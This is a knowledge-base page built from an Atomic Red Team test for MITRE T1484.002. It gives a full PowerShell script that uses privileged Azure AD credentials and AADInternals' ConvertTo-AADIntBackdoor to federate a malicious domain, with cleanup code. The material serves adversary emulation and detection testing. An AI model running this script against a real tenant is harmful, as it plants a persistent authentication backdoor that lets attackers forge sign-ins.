---
atomic_guid: "8906c5d0-3ee5-4f63-897a-f6cafd3fdbb7"
title: "Add Federation to Azure AD"
framework: "atomic"
generated: "true"
attack_technique_id: "T1484.002"
attack_technique_name: "Domain Trust Modification"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1484.002/T1484.002.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "8906c5d0-3ee5-4f63-897a-f6cafd3fdbb7"
  - "Add Federation to Azure AD"
platforms:
  - "azure-ad"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Add Federation to Azure AD

Add a new federated domain to Azure AD using PowerShell.
The malicious domain to be federated must be configured beforehand (outside of the scope of this test):
    1. Open Azure Portal
    2. Add a new "custom domain name"
    3. Verify the domain by following instructions (i.e. create the requested DNS record)

## Metadata

- Atomic GUID: 8906c5d0-3ee5-4f63-897a-f6cafd3fdbb7
- Technique: T1484.002: Domain Trust Modification
- Platforms: azure-ad
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1484.002/T1484.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1484-domain_or_tenant_policy_modification|T1484.002]]

## Input Arguments

### azure_password

- description: Password of azure_username
- type: string
- default: iamthebatman

### azure_username

- description: Username of a privileged Azure AD account such as External Identity Provider Administrator or Global Administrator roles
- type: string
- default: bruce.wayne@contosocloud.com

### domain_name

- description: Malicious federated domain name
- type: string
- default: contoso.com

## Dependencies

AzureAD and AADInternals Powershell modules must be installed.

### Prerequisite Check

```text
if ((Get-Module -ListAvailable -Name AzureAD) -And (Get-Module -ListAvailable -Name AADInternals)) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
Install-Module -Name AzureAD -Force
Install-Module -Name AADInternals -Force
```

## Executor

- name: powershell

### Command

```powershell
Import-Module AzureAD
Import-Module AADInternals

$PWord = ConvertTo-SecureString -String "#{azure_password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{azure_username}", $Pword

try {
  Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null
}
catch {
  Write-Host "Error: AzureAD could not connect"
  exit 1
}

try {
  $domain = Get-AzureADDomain -Name "#{domain_name}"
}
catch {
  Write-Host "Error: domain ""#{domain_name}"" not found"
  exit 1
}
if (-Not $domain.IsVerified) {
  Write-Host "Error: domain ""#{domain_name}"" not verified"
  exit 1
}

if ($domain.AuthenticationType -eq "Federated") {
  Write-Host "Error: domain ""#{domain_name}"" already federated. Try with a different domain or re-create it before."
  exit 1
}

$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential
if (-Not $at) {
  Write-Host "Error: AADInternals could not connect"
  exit 1
}

$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName "#{domain_name}"
if ($new) {
  Write-Host "Federation successfully added to Azure AD"
  Write-Host $new
}
else {
  Write-Host "The federation setup failed"
}

Write-Host "End of federation configuration."
```

### Cleanup

```powershell
try {
  Import-Module AzureAD -ErrorAction Ignore

  $PWord = ConvertTo-SecureString -String "#{azure_password}" -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{azure_username}", $Pword
  Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null

  Remove-AzureADDomain -Name "#{domain_name}" -ErrorAction Ignore
} catch {}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1484.002/T1484.002.yaml)
